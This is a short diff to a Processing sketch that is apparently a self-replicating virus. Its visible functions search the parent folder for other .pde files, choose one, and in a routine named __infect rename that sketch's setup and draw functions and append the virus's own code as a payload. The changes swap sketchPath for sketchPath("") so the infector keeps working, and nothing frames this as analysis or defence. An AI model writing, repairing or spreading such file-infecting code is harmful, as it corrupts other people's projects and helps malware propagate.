@@ -8,7 +8,7 @@ void _draw() {}
 void __getPDEPaths(ArrayList<File> a, String dir) {
   File file = new File(dir);
   if (file.isDirectory()) {
-    if (file.getAbsolutePath().equals(sketchPath))
+    if (file.getAbsolutePath().equals(sketchPath("")))
       return;
     File[] subfiles = file.listFiles();
     for (int i = 0; i < subfiles.length; i++) {
@@ -72,7 +72,7 @@ void __infect(File f) {
   
   /* setup and draw are renamed, we can now append ourselve */
   if (setupReplaced && drawReplaced) {
-    String pathToSelf = new File(sketchPath).getName() + ".pde";
+    String pathToSelf = new File(sketchPath("")).getName() + ".pde";
     String[] code = loadStrings(pathToSelf);
     boolean foundMarker = false;
     String payload = "";
@@ -110,7 +110,7 @@ void __infect(File f) {
 
 void setup() {
   ArrayList<File> allFiles = new ArrayList<File>();  
-  String path = new File(sketchPath).getParent();
+  String path = new File(sketchPath("")).getParent();
   __getPDEPaths(allFiles, path);
   File f = __getTheChosenOne(allFiles);
   
